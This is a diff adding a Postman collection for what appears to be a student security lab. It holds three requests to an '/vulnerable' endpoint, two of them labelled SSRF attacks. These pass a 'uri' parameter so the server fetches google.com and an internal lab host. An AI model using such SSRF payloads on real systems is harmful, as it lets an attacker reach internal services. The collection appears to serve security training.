@@ -1,0 +1,121 @@
+{
+	"info": {
+		"_postman_id": "5eec5341-0597-4652-910d-261ed43fa18c",
+		"name": "student-class3-module4-lab02",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Request 1: Retrieve Attributes",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"vulnerable"
+					],
+					"query": [
+						{
+							"key": "useridentity",
+							"value": "hackeduser"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 2: SSRF Attack - Google",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&uri=https://www.google.com",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"vulnerable"
+					],
+					"query": [
+						{
+							"key": "useridentity",
+							"value": "hackeduser"
+						},
+						{
+							"key": "uri",
+							"value": "https://www.google.com"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 3: SSRF Attack - unprotected-json",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&uri=http://unprotected-json.f5lab.local/",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"vulnerable"
+					],
+					"query": [
+						{
+							"key": "useridentity",
+							"value": "hackeduser"
+						},
+						{
+							"key": "uri",
+							"value": "http://unprotected-json.f5lab.local/"
+						}
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "CLIENT_ID",
+			"value": ""
+		}
+	]
+}
